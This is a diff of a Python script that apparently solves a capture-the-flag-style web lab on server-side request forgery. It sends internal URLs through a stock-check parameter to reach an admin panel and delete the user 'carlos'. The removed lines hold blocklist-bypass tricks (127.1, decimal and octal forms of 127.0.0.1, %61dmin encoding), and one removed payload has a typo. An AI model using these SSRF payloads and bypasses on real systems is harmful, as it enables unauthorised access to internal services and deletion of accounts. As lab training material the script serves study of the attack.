@@ -1,11 +1,7 @@
-#IP: 127.0.0.1
-#Differant versions of ip localhost ,127.1 
-#Converted Decimal IP:	2130706433
-#Converted Octal IP :0177.0000.0000.0001 (017700000001)
-# all possible ip forms after testing are 127.1 , 0177.0000.0000.0001 (017700000001) , 2130706433 as 127.0.0.1 is black listed
-#word admin also is black listed and he perform check on single Url encoding 
-#admin is bocked
-#possible admin form is %61dmin
+#our reconasense info is  
+#localhost_URL = http://localhost/
+#admin_URL = http://localhost/admin
+#carlos_deletetion_Url = http://localhost/admin/delete?username=carlos
 import requests
 import sys
 import urllib3
@@ -19,7 +15,7 @@ proxies ={'http' : 'http://127.0.0.1:8080' ,'https':'http://127.0.0.1:8080'}
 
 def delete_user(url):
     #ssrf payload
-    delete_user_url="http://127.1/%61min/delete?username=carlos" #SSRF payload request library will encode it once so we do not have to perform double URL encodind 
+    delete_user_url="http://localhost/admin/delete?username=carlos" #SSRF payload
     check_stock_path="/product/stock"
     params_deletion={'stockApi':delete_user_url}
     #sending request to delete the user
@@ -27,7 +23,7 @@ def delete_user(url):
     ,verify=False, proxies=proxies )
     #now the user is deleted
     # we need to check if it is actully deleted
-    admin_interface='http://127.1/%61dmin/'
+    admin_interface='http://localhost/admin'
     params_checking={'stockApi':admin_interface}
     req=requests.post(url +check_stock_path ,data=params_checking
     ,verify=False, proxies=proxies )
@@ -60,4 +56,4 @@ if __name__ == "__main__":
     
 #to run this code
 #write in terminal
-#python3 3SSRF_with_blacklist-based_input_filte.py "Url of the lab"   
+#python3 1-SSRF_against_local_server.py "Url of the lab"   
